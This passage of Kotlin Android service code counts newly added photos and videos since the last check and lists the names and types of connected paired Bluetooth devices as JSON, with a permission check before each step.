                val hasVid = checkSelfPermission("android.permission.READ_MEDIA_VIDEO") == android.content.pm.PackageManager.PERMISSION_GRANTED
                if (hasVid || hasLegacy) {
                    val cur = contentResolver.query(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        arrayOf("_id"),
                        "${MediaStore.Video.Media.DATE_ADDED} > ?",
                        arrayOf(lastCheckSec.toString()), null)
                    cur?.use { videos = it.count }
                }
            } catch (_: Exception) {}

            sp.edit().putLong("media_last_check", now).apply()
            if (photos > 0 || videos > 0) {
                result.put("photos", photos)
                result.put("videos", videos)
                result.put("since", lastCheck)
            }
        } catch (_: Exception) {}
        return result
    }

    // Get currently connected Bluetooth devices.
    private fun getBluetoothDevices(): org.json.JSONArray {
        val arr = org.json.JSONArray()
        try {
            val hasPerm = if (android.os.Build.VERSION.SDK_INT >= 31)
                checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) == android.content.pm.PackageManager.PERMISSION_GRANTED
            else true
            if (!hasPerm) return arr
            val bm = getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager ?: return arr
            val adapter = bm.adapter ?: return arr
            // Bonded (paired) devices that are currently connected
            for (dev in adapter.bondedDevices ?: emptySet()) {
                try {
                    // Check if device is actually connected via any profile
                    val connected = bm.getConnectionState(dev, BluetoothProfile.GATT) == BluetoothProfile.STATE_CONNECTED ||
                        bm.getConnectionState(dev, BluetoothProfile.GATT_SERVER) == BluetoothProfile.STATE_CONNECTED
                    // Also add recently seen bonded devices with their type
                    val devType = when (dev.bluetoothClass?.majorDeviceClass) {
                        0x0400 -> "audio"    // Audio/Video
                        0x0200 -> "phone"
                        0x0100 -> "computer"
                        0x0500 -> "peripheral"
                        0x0600 -> "imaging"
                        0x0700 -> "wearable"
                        else -> "other"
                    }
                    if (connected) {
                        arr.put(JSONObject().apply {
                            put("name", dev.name ?: "Unknown")
                            put("type", devType)
                            put("connected", true)
                        })
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return arr
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
